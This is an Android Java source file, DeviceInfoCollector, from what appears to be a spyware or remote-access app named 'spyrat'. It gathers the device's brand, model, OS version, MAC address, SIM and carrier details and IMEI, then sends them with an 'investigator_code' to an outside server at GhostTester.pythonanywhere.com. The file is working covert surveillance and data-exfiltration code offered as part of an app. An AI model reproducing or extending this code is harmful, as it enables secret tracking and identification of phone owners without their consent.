package com.spyrat.investigation;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;
import org.json.JSONObject;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Locale;

public class DeviceInfoCollector {
    private static final String TAG = "SpyratDeviceInfo";

    public static void sendDeviceInfo(Context context, String deviceId, String investigatorCode) {
        try {
            JSONObject deviceInfo = new JSONObject();
            
            // Basic device information
            deviceInfo.put("device_id", deviceId);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("device", Build.DEVICE);
            
            // Android version information
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("build_id", Build.DISPLAY);
            
            // Network information
            deviceInfo.put("mac_address", getMacAddress());
            deviceInfo.put("language", Locale.getDefault().getLanguage());
            deviceInfo.put("country", Locale.getDefault().getCountry());
            
            // Telephony information
            addTelephonyInfo(context, deviceInfo);
            
            // Storage information
            addStorageInfo(deviceInfo);
            
            // Send device info
            sendDeviceData(deviceId, investigatorCode, deviceInfo);
            Log.d(TAG, "✅ Device info imetumwa");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Device info error: " + e.getMessage());
        }
    }

    private static void addTelephonyInfo(Context context, JSONObject deviceInfo) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            if (PermissionManager.hasCallLogPermission(context)) {
                deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                deviceInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                deviceInfo.put("phone_type", getPhoneType(telephonyManager.getPhoneType()));
                
                // IMEI requires special permission
                if (context.checkCallingOrSelfPermission(android.Manifest.permission.READ_PHONE_STATE) 
                    == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        deviceInfo.put("imei", telephonyManager.getImei());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Telephony info error: " + e.getMessage());
        }
    }

    private static void addStorageInfo(JSONObject deviceInfo) {
        try {
            Runtime runtime = Runtime.getRuntime();
            long maxMemory = runtime.maxMemory();
            long totalMemory = runtime.totalMemory();
            long freeMemory = runtime.freeMemory();
            
            deviceInfo.put("max_memory", maxMemory);
            deviceInfo.put("total_memory", totalMemory);
            deviceInfo.put("free_memory", freeMemory);
            deviceInfo.put("available_processors", runtime.availableProcessors());
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Storage info error: " + e.getMessage());
        }
    }

    private static String getMacAddress() {
        try {
            for (NetworkInterface networkInterface : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (networkInterface.getName().equalsIgnoreCase("wlan0")) {
                    byte[] macBytes = networkInterface.getHardwareAddress();
                    if (macBytes == null) {
                        return "";
                    }
                    
                    StringBuilder res = new StringBuilder();
                    for (byte b : macBytes) {
                        res.append(String.format("%02X:", b));
                    }
                    
                    if (res.length() > 0) {
                        res.deleteCharAt(res.length() - 1);
                    }
                    return res.toString();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ MAC address error: " + e.getMessage());
        }
        return "unknown";
    }

    private static String getPhoneType(int phoneType) {
        switch (phoneType) {
            case TelephonyManager.PHONE_TYPE_GSM:
                return "GSM";
            case TelephonyManager.PHONE_TYPE_CDMA:
                return "CDMA";
            case TelephonyManager.PHONE_TYPE_SIP:
                return "SIP";
            case TelephonyManager.PHONE_TYPE_NONE:
                return "NONE";
            default:
                return "UNKNOWN";
        }
    }

    private static void sendDeviceData(String deviceId, String investigatorCode, JSONObject deviceInfo) {
        try {
            JSONObject postData = new JSONObject();
            postData.put("device_id", deviceId);
            postData.put("investigator_code", investigatorCode);
            postData.put("data_type", "device_info");
            postData.put("data_content", deviceInfo);

            NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
        } catch (Exception e) {
            Log.e(TAG, "❌ Device data send error: " + e.getMessage());
        }
    }
}
